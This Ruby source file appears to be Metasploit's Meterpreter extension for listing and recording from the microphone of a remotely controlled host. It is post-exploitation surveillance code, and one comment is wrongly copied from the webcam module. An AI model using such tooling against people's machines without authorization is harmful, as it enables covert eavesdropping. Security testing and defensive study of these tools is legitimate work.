# -*- coding: binary -*-

require 'rex/post/meterpreter/channel'
require 'rex/post/meterpreter/channels/pools/audio_stream_pool'

module Rex
  module Post
    module Meterpreter
      module Extensions
        module Stdapi
          module Mic

            ###
            #
            # This meterpreter extension can list and capture from microphone
            #
            ###
            class Mic
              include Msf::Post::Common

              def initialize(client)
                @client = client
              end

              def session
                @client
              end

              def mic_list
                response = client.send_request(Packet.create_request('audio_mic_list'))
                names = []
                response.get_tlvs(TLV_TYPE_AUDIO_INTERFACE_FULLNAME).each do |tlv|
                  names << tlv.value
                end
                names
              end

              # Starts recording video from video source of index +cam+
              def mic_start
                request = Packet.create_request('audio_mic_start')
                request.add_tlv(TLV_TYPE_AUDIO_INTERFACE_NAME, 0)
                response = client.send_request(request)
                #channel_id = response.get_tlv_value(TLV_TYPE_CHANNEL_ID)
                # If we were creating a channel out of this

                channel = Channel.create(client, 'audio_mic', Rex::Post::Meterpreter::Channels::Pools::AudioStreamPool, CHANNEL_FLAG_SYNCHRONOUS)

                #if (channel_id != nil)
                #  channel = Rex::Post::Meterpreter::Channels::Pools::StreamPool.new(client,
                #    channel_id, "audio_mic", CHANNEL_FLAG_SYNCHRONOUS)
                #end
              end

              def mic_get_frame(quality)
                request = Packet.create_request('audio_mic_get_frame')
                request.add_tlv(TLV_TYPE_AUDIO_DURATION, quality)
                response = client.send_request(request)
                response.get_tlv(TLV_TYPE_AUDIO_DATA).value
              end

              def mic_stop
                client.send_request(Packet.create_request('audio_mic_stop'))
                true
              end

              attr_accessor :client
            end
          end
        end
      end
    end
  end
end
